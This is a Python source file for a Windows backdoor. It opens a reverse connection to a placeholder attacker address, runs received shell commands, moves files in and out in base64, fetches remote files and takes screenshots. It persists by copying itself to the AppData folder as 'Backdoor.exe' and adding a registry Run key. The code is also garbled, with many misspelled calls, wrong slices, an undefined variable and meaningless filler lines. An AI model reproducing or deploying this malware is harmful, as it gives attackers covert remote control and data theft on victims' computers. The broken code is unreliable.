import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests
import ctypes
import mss

def reliable_send(data):
    json_data=json.dumps(data)
    sock.send(json_data)

def reliable_recv():
    json_data=""
    while True:
        try:
            json_data=json_data + sock.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue

def is_admin():
    global admin
    try:
        temp= os.lisdtdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
    except:
        admin="[!!] User Privileges!"
    else:
        admin="[+] Administrator Privileges!"

def screenshot():
    with mss() as screenshot:
        screenshot.shot()

def download(url):
    get_reponse=requests.get(url)
    file_name=url.split("/")[-1]
    with open(file_name,"wb") as out_file:
        out_file.write(get_response.content)

def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect(("IP",PORT))
            shell()
        except:
            connection()

def shell():
    while True:
        command=reliable_recv()
        if command=="q":
            break
        elif command == 'help':
            help_options="fdhkdhskjhsdk"
            reliable_send(help_options)
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:1])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:],"rb") as file:
                reliable_send(base64.b64encode(file,read))
        elif command[:6] == "upload":
            with open(command[7:],"wb") as fin:
                      result=reliable_recv()
                      fin.write(base64.b64encode(result))
        elif command[:3] == "get":
            try :
                download(command[4:])
                reliable_send("[+] Downl")
            except:
                reliable_send("[failed")
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:],shell=True)
                reliable_send("started")
            except:
                reliable_send("failed")
        else:
            try:
                proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                result=pros.stdout.read()+proc.stderr.read()
                reliable_send(result)
            except:
                reliable_send("[!!] cant execute")

location=os.environ["appdata"] + "\\Backdoor.exe"
if not os.pathh.exists(location):
    shutil.copyfile(sys.executable,location)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrenVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell =True)
    try:
        subprocess.Popen(name,shell=True)
    except:
        number=3
        number1=5
        addition=number+number1
sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()
